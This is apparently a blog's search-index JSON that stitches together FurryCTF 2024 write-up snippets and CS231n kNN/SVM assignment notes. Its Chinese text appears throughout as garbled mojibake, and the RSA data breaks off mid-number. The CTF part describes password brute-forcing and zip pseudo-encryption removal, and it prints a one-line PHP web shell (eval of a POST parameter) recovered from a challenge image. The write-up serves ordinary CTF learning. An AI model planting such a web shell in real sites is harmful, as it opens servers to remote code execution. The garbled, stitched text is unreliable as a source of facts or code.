qdw2Zo qx8n[{ sy,\u003cj\u003e t]:N(M uA4#2@ va?PqP w}1=k] xro\u003cLJ y#Ll;O ynaQVG }'Qm:, 5 å­—èŠ‚çš„ï¼Œç›´æ¥æš´åŠ›è·‘ (è·‘äº†å‡ ååˆ†é’Ÿ)ï¼š æœ€åéƒ½æ‹¼æˆå­—å…¸ç”¨ archpr æš´åŠ›ç ´è§£ã€‚ å¾—åˆ°å¯†ç ï¼Œè§£å‹å³å¯ã€‚ ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:11:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"M [misc]æ­¤æ—¶æ— å£°èƒœæœ‰å£° ç›´æ¥ç”¨ Audacity æ‰“å¼€ã€‚ çœ‹å›¾å‘ç°æ˜¯ furryCTF{B1ack_Pi2no} ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:12:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"E [misc]é»‘æš— ä¸€å¼€å§‹æ²¡ä»€ä¹ˆå¤´ç»ªï¼Œä½†æ˜¯å¿…é¡»è¦è€ƒè™‘æ•°å­—é¡ºåº (å—æ±‚è€Œä¸å¾—å¯å‘)ã€‚ 010editor å‘ç° 8 å¼ å›¾ç‰‡çš„æ–‡ä»¶å°¾ä¸ä¸€æ ·ï¼Œä¾æ¬¡æ˜¯ï¼š ZnVy cnlD VEZ7 SGVs bG9f SUVO RF9B d0F9 æ‹¼èµ·æ¥æ˜¯ ZnVycnlDVEZ7SGVsbG9fSUVORF9Bd0F9ï¼ŒBase64 è§£ç ã€‚ ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:13:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"L [misc]æ˜¥é£å¾—æ„ é¢˜é¢æç¤ºè¶´åœ¨ç”µè„‘ä¸Šï¼Œæ‰€ä»¥è€ƒè™‘é”®ç›˜åŠ å¯†ã€‚å‘ç°å‰é¢æŒ‰ 8 ä¸ªå­—ç¬¦åˆ†ç»„æ˜¯ï¼š egtrcvge 6i87hji6 3t54dft3 3t54dft3 5u76ghu5 VSFSFFXD 4Y65FGY4 EGTRCVGE 0]=-;']0 å¯¹åº” furryCTF{ æŒ‰ç…§å¯†æ–‡è„‘è¡¥æ˜æ–‡ (ç–¯ç‹‚çœ‹ç”µè„‘é”®ç›˜)ã€‚ å¾—åˆ°ç­”æ¡ˆ furryCTF{keyboard_with_random_cout} ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:14:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"R [misc]å›¾ç‰‡çš„ç§˜å¯† æ ‡é¢˜æç¤ºå›¾ç‰‡ï¼Œè€ƒè™‘ä½¿ç”¨ SSTVï¼ŒéŸ³é¢‘å˜æˆå›¾ç‰‡ã€‚ æšä¸¾å‡¯æ’’åŠ å¯†ï¼Œå­—æ¯å¾€å‰ç§» 10 ä½ furryCTF{WELAOME_TO_FURRYCTF!} ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:15:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"_ [mobile]ç™»å½• è§£åŒ…æœ furryCTF ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:16:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"` [mobile]è®¤è¯ç³»ç»Ÿ ç»§ç»­è§£åŒ…æœ furryCTF ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:17:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"C [misc]å®‰è£…åŒ… è§£å‹å®‰è£…åŒ…å‘ç° flag å‡¯æ’’è§£ä¸å‡ºæ¥ï¼Œè€ƒè™‘ç»´å‰å°¼äºšå¯†ç ï¼Œå¯†é’¥æ˜¯ furryCTF ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:18:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"d [rev]çƒ¦äººçš„é»‘æ¡†æ¡† å‘ç°ç¨‹åºå›¾æ ‡æ˜¯ Python ç¼–å†™ï¼Œä½¿ç”¨ pyinstxtractor.py åç¼–è¯‘ã€‚ åç¼–è¯‘ trojan.pyc Base32 è§£å¯†ã€‚ ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:19:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"f [crypto]äº¡ç¾Šè¡¥ç‰¢ æšä¸¾ä¸€ä¸‹æ …æ ï¼Œå‘ç° 9 ä¸å¯¹åŠ²ã€‚ ç„¶åå‘ç°æ¯äº”ä¸ªå­—ç¬¦è¿›è¡Œåˆ†ç»„ï¼Œå‰ä¸¤ç»„æŒ‰ç…§ swap(s[1], s[2]) swap(s[0], s[2]) swap(s[2], s[3]) çš„äº¤æ¢è§„åˆ™å¯ä»¥å¾—åˆ° furryCTF{Aï¼Œäºæ˜¯æ¨¡æ‹Ÿä¸€ä¸‹å¾—åˆ°ç­”æ¡ˆã€‚ ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:20:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"H [misc]ä¹±ç  å¼€å§‹æƒ³ç»Ÿè®¡ä¸€ä¸‹å­—ç¬¦é›†ï¼Œæ²¡æƒ³åˆ°å­—ç¬¦é›†æœ‰æ„å¤–æ”¶è· (å‡ºç° furryCTF å’Œ {} ç­‰)ï¼Œç„¶åè¯é¢‘ç»Ÿè®¡ä¸€ä¸‹ã€‚ å°è¯•æŒ‰è¯é¢‘æ’åºã€‚ è¡¥ä¸€ä¸ª r ç„¶åå¾—åˆ°ç­”æ¡ˆï¼šfurryCTF{How_Man1-times} ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:21:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"Z [web]å‰‘èµ°åé”‹ å‘ç° furry å’Œ CTF å‚æ•°å¯ä»¥æœ‰ ./ï¼Œåˆå‘ç° CTF å‚æ•°å¯ä»¥æœ‰é—®å·ï¼Œäºæ˜¯æ¨¡ç³ŠåŒ¹é…ã€‚ æ­£ç¡® flag ä¸ºï¼šfurryCTF{Hundred_Secrets_An6_4_Mere_Care1essness} ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:22:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"è¡¥é¢˜ ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:23:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"F [misc]æ ¡å›­æµè§ˆå™¨ ä¸æ˜¯ï¼Œå•Šï¼Ÿè¿™ä¸ºä»€ä¹ˆä¸æ˜¯ osint é¢˜ï¼ï¼ ç‚¹ä¸€ä¸‹ V5 å°±å¯ä»¥äº†ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ç­‰çº§ã€‚ã€‚ ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:24:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"T [misc]ç½‘ç›˜ æŠŠè¿™å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ åˆ°ç½‘ç›˜å°±å¯ä»¥å¾—åˆ° flag å›¾ç‰‡äº†ã€‚è¿˜èƒ½è¿™æ ·å±å®æ²¡æƒ³åˆ°ï¼ŒåŸç†æ˜¯ MD5 ç¢°æ’ã€‚ ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:25:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"U [web]flagä¸‹è½½ æ²¡é“ç†çš„ï¼Œçº¯æ²¡é“ç†çš„ã€‚ https://hydro.ac/p/34977/file/flag.txt?tid=6728fe9aa325b9e5ba5f9489 æ‰“å¼€æ–‡ä»¶å‘ç°æ˜¯ furryCTF%7BD%23n't_Y%25u_Kn%40w_The_HTML_Re*p0nce%7D URL è§£ç ï¼š furryCTF{D#n't_Y%u_Kn@w_The_HTML_Re*p0nce} ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:26:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"V [web]åˆ—è¡¨ ä½¿ç”¨å †å¿«ç…§ï¼š å»æŸ¥æ‰¾è¯¥ Scratch é¡¹ç›®çš„ JSON æ–‡ä»¶ï¼Œæ‰€ä»¥æœç´¢ {\"targets\":[{\"isStage\":true å¹¶çœ‹åˆ°ä¸€ä¸ªå¥‡æ€ªçš„å†…å®¹ï¼Œé¼ æ ‡é™„ä¸Šå»æœ€åèƒ½çœ‹åˆ°ä¸€ä¸²å¯†ç ã€‚(ä¸æ˜¯å“¥ä»¬è¿™è°èƒ½æ‰¾åˆ°å•Šï¼) F$_\u003ci}Zp:\u0026yd\u0026AXeCQ'#]Zap5Gf\u0026ojDyCN\u0026KN$*N$4j\u003e*DdpE^jc/=2h5IgRY8\\ Base92 è§£ç ï¼š ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:27:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"W [web]é›ªèŠ±é£˜é£˜ ä¸€å¼€å§‹æ˜¯é¶æœºæ­çš„ webï¼Œä½†åæ¥æŒ‚äº†æ¢æˆ GitHubï¼Œè¿™è®©æˆ‘å¾—çŸ¥äº†è·Ÿè¯·æ±‚æ²¡æœ‰å•¥å…³ç³»ï¼Œé‡ç‚¹çœ‹å¯ç–‘çš„ JS æ–‡ä»¶ã€‚ æ³¨æ„åˆ° snowflakes.min.js æ–‡ä»¶é‡Œæœ‰ä¸€ä¸²å¯ç–‘å¯†ç  (æ³¨æ„åŠ›æƒŠäºº) 50955130862247346033128821496195502070347087340218689554242763562407659428661122869571965 å…ˆè½¬ä¸ª 16 è¿›åˆ¶ï¼š 66757272794354467b466c79316e675f536e6f775f49735f53305f4265617574696675317d å†è½¬ä¸ª Hex å¾—åˆ° flagï¼š ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:28:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"X [web]å²è±å§†çš„ä¸–ç•Œ éšä¾¿æ‰¾æ‰¾ï¼Œé«˜ç©æ¦œé‡Œæœ‰é•œåƒçš„ flagï¼š ç­”æ¡ˆä¸ºï¼šfurryCTF{The_Wyrms1ayer_0f_Ender_Drag0n} ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:29:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"P [misc] æ¹æµç»†æœ¨ ç”¨ Wireshark æ‰“å¼€æµé‡åŒ…ï¼Œæœç´¢å­—ç¬¦ä¸² flag æ‰¾åˆ°ç½‘å€ã€‚ ç„¶åç”¨ winHex æ‰“å¼€å›¾ç‰‡ï¼Œå‘ç°æœ«å°¾æœ‰å¯ç–‘çš„ PHP æ˜¾ç¤ºä¹±ç ï¼Œå°è¯•å­—ç¬¦é›†è½¬æˆ UTF-8ï¼Œå‘ç°æ˜¯å¦‚ä¸‹ï¼š \u003c?php eval($_POST('â ‹â ¥â —â —â ½â ‰â â ‹{â â ‘â ‘â ¸â ½â •â ¥â ¸â â ›â â ‚â }'))?\u003e è¿™æ˜¯ç›²æ–‡ï¼Œç”¨ä¸€ä¸‹è½¬æ¢å™¨å¾—åˆ° flag ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:30:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"b [rev]Login è¿™ä¸ªé¢˜å·®ä¸€ç‚¹ç‚¹å°±è¿‡äº†ã€‚ç‰¢è®°æ•°å­—è½¬ hexï¼ IDA æ‰“å¼€ä¸€ä¸‹ï¼Œç„¶åçœ‹ strings çš„è§†å›¾æ‰¾åˆ°å¯ç–‘å­—ç¬¦ä¸²50955130862247346033129849911215869256974228669048534734398765262912025541901441526490493 å’Œé›ªèŠ±é£˜é£˜ä¸€æ ·ï¼Œè½¬ 16 è¿›åˆ¶å†è½¬ hex å¾—åˆ° flag furryCTF{P0inter_Is_Out_Of_The_Ran9e} ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:31:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"c [rev]MEMZ ç”¨ ARCHPR æš´åŠ›ç ´è§£å‡ºå¯†ç  furry ç„¶åè¿˜æ˜¯ç”¨ IDA æ‰“å¼€é‡Œé¢çš„æ–‡ä»¶åšå’Œ b é¢˜ç›¸åŒçš„æ“ä½œã€‚å¾—åˆ°æ•°å­— 181028990419375709681764670364570214516897360554680698682721225149223938429 ç„¶åç»§ç»­åšç›¸åŒæ“ä½œå¾—åˆ° flagï¼šfurryCTF{MEMZ_W1th_furryCTF_:)} ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:32:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"g [crypto]Scratch ç›´æ¥æŠŠ project.json åç¼€æ”¹æˆ sb3ï¼Œç„¶åç”¨ scratch åœ¨çº¿ç½‘ç«™ æ‰“å¼€ 102 117 114 114 121 67 84 70 123 76 105 102 101 95 49 115 95 83 105 110 103 49 110 103 125 è¿™æ˜¾ç„¶æ˜¯ ASCII ç ï¼Œè½¬æˆå­—ç¬¦ä¸²ã€‚ ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:33:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"j [crypto]ç²—å¿ƒçš„çŒ«çŒ« æ‹¿åˆ°å‹ç¼©åŒ…å…ˆæ£€éªŒå¹¶å»é™¤ä¼ªåŠ å¯† 09 æ”¹ 00 æ‹¿åˆ° RSA.py import gmpy2 import random def generate_large_prime_by_digits(n): random_num_str = ''.join(random.choices('0123456789', k=n)) random_num = gmpy2.mpz(random_num_str) if random_num \u003c (10 ** (n - 1)): random_num = gmpy2.mpz('1' + random_num_str) large_prime = gmpy2.next_prime(random_num) return large_prime p = generate_large_prime_by_digits(1024) while True: q = generate_large_prime_by_digits(1024) e=65537 n=p*q code=int(input(\"flag is:\")) enc=pow(code,e,n) print(\"enc=\",enc,\"n=\",n) å‘ç° e=65537ï¼Œå†™è„šæœ¬ import math from Crypto.Util.number import long_to_bytes enc1=14177645175039229116346030403132099232252291153135307407968472015386303969683440897768815154592798117707771834485750461958443494947077758686797445730457810973274288497317238758699116770492362164018314656983870227104328935858969940914375276048149445994058151332456001392503777508200612633803312738586770586755013253205953269657307673778973476227494712144720441189698203045625466899244934392249740966985280244968876913636228035050537977472852346681757901914549624771278966903150572142886596754698966732044532202038232827298624740542580907036703357527815925181548750101170784981364664580512451534103637029856932407134866372713573545050892181185667064803687344711738898892838348108679006582429550280239878299713862061257101727544519979298670679547873030689357800544769896490678581665642152338087552510986570351080648866785919010250813510930181871917743091330970945292451475777264717478411897482788457237513337893000855934977851366995648686944439625119226736305985408249926817752951238053324680244459535284276788239830947558347535661273319272484426815624119065243814479879857227145702378384759185314521936222526848877809462669205720864948586639549366689439976188939046094706634697938828506448713318664719793526508677047964791882055229097094781355551992321052050659928504783119721120774623169080609520865738446131354441282017108450334959907176316850807504353060288090773899541830156545907659887546868659349496971137510457219070328808047883992985109715387908536371129932819658627586772048725108230180498906483055208587614479396813916197684987133676920294287905763418186855940039145683340370669962759840202308485657591957590273832469518324770544333477076900023293723036842238146047083500015962610279943202343016823333927538123149146284856126566138456780044758422390128056433588123572267326282082937925150760280856896266334230763089077110273446705797808420211653823402873724031368031219469218762817642063689845991466836385443863409322164086224047368995544586280661464612101614921197417828356003039287413996830974696626978384439317161695922653499755056482841 enc2=2616225154450846689007019196467926428889335392687050302769125495331219155668425194780781458645304149681663973357461389224562424487784310794756579631345719496320832579698822304406489281432570702452882703080294827491547820478810444983638468616932258002719179818081343158089855576463264164753561267674729628882776567546366017222741226772322238364747330373462896755140824095623231991834869394764529723605422659813046495933553203308416526932431661892228085539797510953948913494048115598908447500306735781632990876053715796840734065637083945498816978333903291427504950094532586379230459419282607700258159197084544269832027652041906079125435947691174280332211485671223498673100624653184850860369692866219691645715021136039458382854909116076746371597369292705809382543578366227650803513829227929083620479933681739010669550872704078690203057990245007222842377199187630912571959046950453779754976367572287610253489085892895641300580823474487881469457303399310570371696799051815628502806994314131920638865962130784092479812783980140649364864396941794438536482030819400982032060756086798896937337971590567401617556346039733036739426696718046990095907981926703848526590297073083062402619996197924605789667977257490385284288989133931896760472774485362774660568746115642632897456225326350952034168238085875764288239379473879162754911488715293691874202","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:34:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"å‚è€ƒ å®˜æ–¹ WP ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:35:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å­¦äº†é‚£ä¹ˆå¤šç†è®ºäº†åšä¸€ä¸‹æ–¯å¦ç¦å¤§å­¦çš„ CS è¯¾ç¨‹ï¼šCS231nï¼Œå¯¹ CV æœ‰ä¸€ä¸ªåŸºæœ¬çš„è®¤è¯†ï¼ŒåŒæ—¶åŠ å¼ºä¸€ä¸‹å®æ“èƒ½åŠ›ã€‚ è¯¾ç¨‹ç½‘å€ ","date":"2024-12-03","objectID":"/posts/mlcs231n/:0:0","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æœ¬åœ°ç¯å¢ƒéƒ¨ç½² ç”±äº 2024 ç‰ˆçš„æ²¡æœ‰ç»™ jupyter çš„å‹ç¼©åŒ…ï¼Œæ‰€ä»¥å…ˆä¸‹è½½ 2024 colab ç‰ˆæœ¬ï¼Œç„¶ååœ¨ colab ä¸ŠæŠŠæ•°æ®æ‹‰ä¸‹æ¥ç„¶åä¸‹è½½åˆ°æœ¬åœ°ï¼Œæ”¾åˆ° /datasets ä¸‹ï¼Œä¹‹ååˆ é™¤æ‰ä¸€å¼€å§‹çš„ google.colab é©±åŠ¨ç›¸å…³ã€‚ è™šæ‹Ÿç¯å¢ƒçš„è¯å°±ç”¨ conda åˆ›ä¸€ä¸ª python3.7 ç„¶åä½¿ç”¨ 2020 jupyter ç‰ˆæœ¬çš„ requirements.txt ï¼Œå¦‚æœæœ‰æ¼åŒ…æƒ…å†µå†è¯´ã€‚ ä¸ªäººç»ƒä¹  GitHub åœ°å€ ","date":"2024-12-03","objectID":"/posts/mlcs231n/:1:0","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Assignment 1 ","date":"2024-12-03","objectID":"/posts/mlcs231n/:2:0","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Q1: k-Nearest Neighbor classifier æ•°æ®é›†æ˜¯ä¸€ä¸ªå¾ˆå¤š 32 * 32 * 3 (32 Ã— 32 åƒç´ ï¼ŒRGB) çš„å›¾ç‰‡åˆ†ç±»ã€‚ ä¸ºäº†æ–¹ä¾¿å¤„ç†ç›´æ¥å‹æˆä¸€è¡Œï¼Œ$32 \\times 32 \\times 3 = 3072$ åˆ—ã€‚ å–å‰ $5000$ ä¸ªä½œä¸ºè®­ç»ƒé›†ï¼Œå‰ $500$ ä¸ªä½œä¸ºæµ‹è¯•é›†ã€‚ X_train, y_train, X_test, y_test = load_CIFAR10(cifar10_dir) # As a sanity check, we print out the size of the training and test data. print('Training data shape: ', X_train.shape) print('Training labels shape: ', y_train.shape) print('Test data shape: ', X_test.shape) print('Test labels shape: ', y_test.shape) # Subsample the data for more efficient code execution in this exercise num_training = 5000 mask = list(range(num_training)) X_train = X_train[mask] y_train = y_train[mask] num_test = 500 mask = list(range(num_test)) X_test = X_test[mask] y_test = y_test[mask] # Reshape the image data into rows X_train = np.reshape(X_train, (X_train.shape[0], -1)) X_test = np.reshape(X_test, (X_test.shape[0], -1)) print(X_train.shape, X_test.shape) å¯¼å…¥ KNN åˆ†ç±»å™¨ï¼Œä»–å·²ç»æŠŠç±»å†™å¥½äº†ã€‚ from cs231n.classifiers import KNearestNeighbor # Create a kNN classifier instance. # Remember that training a kNN classifier is a noop: # the Classifier simply remembers the data and does no further processing classifier = KNearestNeighbor() classifier.train(X_train, y_train) æ¥ä¸‹æ¥è¦è®¡ç®—è·ç¦»ã€‚éœ€è¦å†™ä¸€ä¸‹ compute_distances_two_loops çš„ TODO # Open cs231n/classifiers/k_nearest_neighbor.py and implement # compute_distances_two_loops. # Test your implementation: dists = classifier.compute_distances_two_loops(X_test) print(dists.shape) TODO: ä¸¤é‡å¾ªç¯è®¡ç®— L2 è·ç¦»ã€‚ np.sqrt() å¼€æ ¹ï¼Œnp.sum() æ±‚å’Œã€‚ def compute_distances_two_loops(self, X): \"\"\" Compute the distance between each test point in X and each training point in self.X_train using a nested loop over both the training data and the test data. Inputs: - X: A numpy array of shape (num_test, D) containing test data. Returns: - dists: A numpy array of shape (num_test, num_train) where dists[i, j] is the Euclidean distance between the ith test point and the jth training point. \"\"\" num_test = X.shape[0] num_train = self.X_train.shape[0] dists = np.zeros((num_test, num_train)) for i in range(num_test): for j in range(num_train): ##################################################################### # TODO: # # Compute the l2 distance between the ith test point and the jth # # training point, and store the result in dists[i, j]. You should # # not use a loop over dimension, nor use np.linalg.norm(). # ##################################################################### # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** dists[i, j] = np.sqrt(np.sum((X[i] - self.X_train[j]) ** 2)) # *****END OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** return dists çœ‹ä¸€ä¸‹è·ç¦»çš„ç½‘æ ¼å›¾ã€‚ # We can visualize the distance matrix: each row is a single test example and # its distances to training examples plt.imshow(dists, interpolation='none') plt.show() Inline Question 1 Notice the structured patterns in the distance matrix, where some rows or columns are visibly brighter. (Note that with the default color scheme black indicates low distances while white indicates high distances.) What in the data is the cause behind the distinctly bright rows? What causes the columns? ${\\textit Your Answer:}$ fill this in. æ³¨æ„è·ç¦»çŸ©é˜µä¸­çš„ç»“æ„åŒ–æ¨¡å¼ï¼Œå…¶ä¸­ä¸€äº›è¡Œæˆ–åˆ—æ˜æ˜¾æ›´äº®ã€‚ï¼ˆæ³¨æ„åœ¨é»˜è®¤çš„é¢œè‰²æ–¹æ¡ˆä¸­ï¼Œé»‘è‰²è¡¨ç¤ºä½è·ç¦»ï¼Œè€Œç™½è‰²è¡¨ç¤ºé«˜è·ç¦»ã€‚ï¼‰ æ•°æ®ä¸­æ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´äº†è¿™äº›æ˜æ˜¾æ›´äº®çš„è¡Œï¼Ÿ æ˜¯ä»€ä¹ˆå¯¼è‡´äº†è¿™äº›æ˜æ˜¾çš„åˆ—ï¼Ÿ ${\\textit Your Answer:}$ è¡Œæ˜¯æµ‹è¯•æ•°æ®ï¼Œåˆ—æ˜¯è®­ç»ƒæ•°æ®ã€‚ç™½è‰²çš„è¡Œæ˜¯è¯¥æµ‹è¯•æ•°æ®è¿œç¦»è®­ç»ƒæ•°æ®ï¼Œç™½è‰²çš„åˆ—æ˜¯è¯¥è®­ç»ƒæ•°æ®è¿œç¦»æµ‹è¯•æ•°æ®ã€‚ TODO: predict_labels np.argsort() è¡¨ç¤ºè¿”å›æ’åºåçš„åŸæ•°ç»„ä¸‹æ ‡ã€‚è¿™é‡Œ [0 : k] å–å‰ $k$ å¤§ï¼Œç„¶åå†æ˜ å°„åˆ° y np.bincount() è¡¨ç¤ºå°†è¾“å…¥æ•°æ®è£…è¿›æ¡¶è®¡æ•°ã€‚ np.argmax() è¡¨ç¤ºå–æœ€å¤§å€¼çš„ä¸‹æ ‡ã€‚ def predict_labels(self, dists, k=1): \"\"\" Given a matrix of distances between test points and training points, predict a label for each test point. Inputs: - dists: A numpy array of shape (num_test, num_train) where dists[i, j] gives the distance betwen the ith test point and the jth training point. Returns: - y: A numpy array of shape (num_test,) containing predicted labels for the test data, where y[i] is the predicted label for the test point X[i]. \"\"\" num_test = dists.shape[0] y_pred = np.zeros(num_test) for i in range(num_","date":"2024-12-03","objectID":"/posts/mlcs231n/:2:1","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Q2: Training a Support Vector Machine è¿˜æ˜¯é‚£ä¸ªæ•°æ®é›†ï¼Œè¿™æ¬¡å…ˆå‡å»ä¸€ä¸ªå›¾åƒåƒç´ çš„å¹³å‡å€¼ã€‚ç„¶åå› ä¸ºæ˜¯ SVMï¼Œæ‰€ä»¥ np.ones åŠ ä¸Šä¸€ä¸ª $1$ çš„åç½®ã€‚ # Preprocessing: subtract the mean image # first: compute the image mean based on the training data mean_image = np.mean(X_train, axis=0) print(mean_image[:10]) # print a few of the elements plt.figure(figsize=(4,4)) plt.imshow(mean_image.reshape((32,32,3)).astype('uint8')) # visualize the mean image plt.show() # second: subtract the mean image from train and test data X_train -= mean_image X_val -= mean_image X_test -= mean_image X_dev -= mean_image # third: append the bias dimension of ones (i.e. bias trick) so that our SVM # only has to worry about optimizing a single weight matrix W. X_train = np.hstack([X_train, np.ones((X_train.shape[0], 1))]) X_val = np.hstack([X_val, np.ones((X_val.shape[0], 1))]) X_test = np.hstack([X_test, np.ones((X_test.shape[0], 1))]) X_dev = np.hstack([X_dev, np.ones((X_dev.shape[0], 1))]) print(X_train.shape, X_val.shape, X_test.shape, X_dev.shape) TODO: svm_loss_naive è®¡ç®—æŸå¤±çš„æ—¶å€™ï¼Œç”¨ X[i].dot(W) è¡¨ç¤ºè¯¥æ¡æ•°æ®åœ¨ $10$ ä¸ªåˆ†ç±»ä¸‹çš„è¡¨ç°å¾—åˆ† (W æ˜¯ 3073 * 10 çš„çŸ©é˜µ)ï¼Œcorrect_class_score = scores[y[i]] è¡¨ç¤ºä»å¾—åˆ†å‘é‡ä¸­æå–å‡ºç¬¬ $i$ ä¸ªæ ·æœ¬çš„æ­£ç¡®ç±»åˆ«çš„å¾—åˆ†ã€‚æ ¹æ®å®˜ç½‘è®²ä¹‰(https://cs231n.github.io/linear-classify/)ï¼Œå®šä¹‰æŸå¤±ä¸º $L_i = \\sum\\limits_{j \\ne y_i}\\max(0, s_j - s_{y_i} + \\Delta)$ ä¸ºä»€ä¹ˆè¿™ä¹ˆå®šä¹‰å‘¢ï¼Ÿæ ¹æ®è®²ä¹‰ The Multiclass Support Vector Machine â€œwantsâ€ the score of the correct class to be higher than all other scores by at least a margin of delta. If any class has a score inside the red region (or higher), then there will be accumulated loss. Otherwise the loss will be zero. Our objective will be to find the weights that will simultaneously satisfy this constraint for all examples in the training data and give a total loss that is as low as possible. å¤šç±»åˆ«æ”¯æŒå‘é‡æœº â€œå¸Œæœ› â€œæ­£ç¡®ç±»åˆ«çš„å¾—åˆ†è‡³å°‘æ¯”æ‰€æœ‰å…¶ä»–ç±»åˆ«çš„å¾—åˆ†é«˜å‡º delta å€¼ã€‚ 